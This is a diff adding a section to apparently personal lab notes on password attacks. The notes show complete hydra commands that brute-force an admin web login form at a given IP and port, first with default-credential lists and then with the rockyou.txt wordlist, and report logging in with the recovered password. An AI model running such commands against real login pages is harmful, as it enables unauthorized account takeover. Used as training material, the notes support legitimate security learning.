@@ -229,3 +229,26 @@ now with the information we need, we can add it to the hydra command:
 
 `"/login.php:username=^USER^&password=^PASS^:F=<form name='login'"`
 
+## Login Form Attacks
+
+first lets use the full hydra command with a list of default usernames and passwords: 
+
+`hydra -C /opt/useful/SecLists/Passwords/Default-Credentials/ftp-betterdefaultpasslist.txt 94.237.62.195 -s 41370 http-post-form "/login.php:username=^USER^&password=^PASS^:F=<form name='login'"`
+
+![](../Images/Pasted%20image%2020231227204223.png)
+
+this did not find any working credentials but at least we ruled out a lot of default credentials 
+
+since this specific login form is for admins, this could potentially rule out a lot of usernames  
+we can then try many default user names such as admin
+
+now we can try with the rockyou.txt list: 
+
+`hydra -l admin -P /usr/share/wordlists/rockyou.txt -f 94.237.62.195 -s 41370 http-post-form "/login.php:username=^USER^&password=^PASS^:F=<form name='login'"`
+
+![](../Images/Pasted%20image%2020231227205301.png)
+
+with the found password we can login: 
+
+![](../Images/Pasted%20image%2020231227205800.png)
+
